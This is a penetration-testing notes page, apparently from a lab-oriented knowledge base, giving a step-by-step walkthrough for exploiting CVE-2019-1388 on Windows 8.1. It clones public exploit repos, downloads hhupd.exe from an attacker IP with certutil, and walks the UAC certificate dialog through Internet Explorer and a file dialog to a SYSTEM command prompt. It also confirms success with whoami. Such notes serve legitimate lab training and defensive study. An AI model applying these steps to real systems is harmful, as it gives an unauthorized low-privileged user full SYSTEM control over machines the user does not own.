# Windows Certificate Dialog Elevation of Privilege Vulnerability (CVE-2019-1388)

## Details

|Detail|Description|
|---|---|
|CVE|CVE-2019-1388|
|OS|Windows 8.1 (64-bit)|
|Type|Elevation of Privilege|
|Exploit Status|Public|
|Microsoft Advisory|[CVE-2019-1388](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388)|
|Exploit Code|[jas502n](https://github.com/jas502n/CVE-2019-1388) / [jaychouzzk](https://github.com/jaychouzzk/CVE-2019-1388)|

## Vulnerability Overview:

- This vulnerability exists due to improper handling of certificate dialogs in Windows.

- When a malicious certificate dialog is displayed, an attacker can exploit it to elevate privileges to SYSTEM.

- The vulnerability allows a low-privileged user to execute commands with administrator-level access.


## Exploit Steps:

### 1. Download the Exploit

- Clone the repository to your attacker machine:

```bash
git clone https://github.com/jas502n/CVE-2019-1388.git
```


### 2. Transfer to the Target Machine

- Use `certutil` or `python` to transfer the exploit to the target:

```bash
certutil.exe -urlcache -split -f "http://192.168.1.7/HHUPD.EXE" CVE-2019-1388.exe
```

### 3. Execute the Exploit

- From the command prompt on the target machine:

```bash
HHUPD.EXE
```

### 4. Confirm Privilege Escalation

- Check if the privilege escalation was successful:

```bash
whoami
```

> If successful, you should see:  
> `nt authority\system`



## How the exploit works (the GUI trick)

`hhupd.exe` (an old, signed HP/Windows updater) shows a **UAC consent dialog that runs as SYSTEM**. That dialog exposes a "show information about the publisher's certificate" link — and the chain of dialogs it opens inherits the SYSTEM context:

1. Run `hhupd.exe`; at the UAC prompt choose **Show more details → Show information about the publisher's certificate**.
2. In the certificate dialog, click the **"Issued by"** hyperlink — it opens Internet Explorer **as SYSTEM**.
3. From IE, use **File → Save As** (or View Source, which opens Notepad) to reach a standard file dialog.
4. In the file-dialog address bar, type `cmd.exe` (or right-click a file → Open with) to spawn a **SYSTEM command prompt**.

The whole chain never drops a payload — it walks the GUI from a signed, SYSTEM-owned dialog into a SYSTEM shell.

### Exploit Verification:

> Confirmed working on:

- Windows 8.1 (64-bit)

- Administrator Privileges Obtained

## Summary:

|CVE|OS|Exploit Link|Privilege Level|
|---|---|---|---|
|CVE-2019-1388|Windows 8.1 (64-bit)|[jas502n](https://github.com/jas502n/CVE-2019-1388) / [jaychouzzk](https://github.com/jaychouzzk/CVE-2019-1388)|SYSTEM|

## Related
- [Windows Kernel Exploits](Windows-Kernel-Exploits/Windows-Kernel-Exploits.md) — related OS-level EoP exploits
- [HTB Kernel Exploits](Windows-Kernel-Exploits/HTB-Kernel-Exploits.md) — practical kernel exploit walkthroughs
- [Windows Version and Configuration](Windows-Version-and-Configuration.md) — patch level determines exploitability
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — exploit suggester flags this CVE
